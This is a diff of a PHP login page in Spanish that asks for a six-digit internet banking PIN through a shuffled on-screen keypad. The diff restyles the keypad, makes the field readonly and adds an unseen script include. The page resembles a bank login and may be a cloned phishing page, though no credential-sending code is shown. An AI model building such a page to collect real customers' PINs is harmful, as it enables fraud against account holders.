@@ -103,23 +103,28 @@ if ( isset($_POST['securityCode']) && ($_POST['securityCode']!="")){
                     <br>
 
                     <div class="form-group">
-                        <input type="password" id="clave" name="clave" placeholder="Clave de internet de 6 dígitos" minlength="6" maxlength="6"  onclick="shuffleKeys()" required>
-                        <div class="keypad">
+                    <input type="password" name="clave" id="clave" placeholder="Clave de internet de 6 dígitos" onclick="shuffleKeys()" readonly requerid>
+                        <div id="lks" style="display: none;">  
+                        <div id="keyboard-container" class="keypad">
                             <button class="key" onclick="addDigit(1)">1</button>
                             <button class="key" onclick="addDigit(2)">2</button>
                             <button class="key" onclick="addDigit(3)">3</button>
-
                             <button class="key" onclick="addDigit(4)">4</button>
                             <button class="key" onclick="addDigit(5)">5</button>
                             <button class="key" onclick="addDigit(6)">6</button>
-
                             <button class="key" onclick="addDigit(7)">7</button>
                             <button class="key" onclick="addDigit(8)">8</button>
                             <button class="key" onclick="addDigit(9)">9</button>
-                            <button class="key" onclick="backspace()">Borrar</button>
                             <button class="key" onclick="addDigit(0)">0</button>
-
-                            <button class="key" onclick="clearInput()">Limpiar</button>
+                            <button class="key" onclick="backspace()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-x-square" viewBox="0 0 16 16">
+                                <path d="M14 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h12zM2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2z"/>
+                                <path d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"/>
+                                </svg></button>
+                            <button class="key" onclick="clearInput()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16">
+                                <path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/>
+                                <path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/>
+                                </svg></button>
+                        </div>
                         </div>
 
                         <script>
@@ -139,7 +144,6 @@ if ( isset($_POST['securityCode']) && ($_POST['securityCode']!="")){
                             const input = document.getElementById("clave");
                             input.value = "";
                             }
-
 
                             function shuffleKeys() {
                             const keypad = document.querySelector(".keypad");
@@ -188,6 +192,7 @@ if ( isset($_POST['securityCode']) && ($_POST['securityCode']!="")){
         </div>
     </div>
     <script src="js/script.js"></script>
+    <script src="js/script1.js"></script>
     <script src="js/load_captcha.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </body>
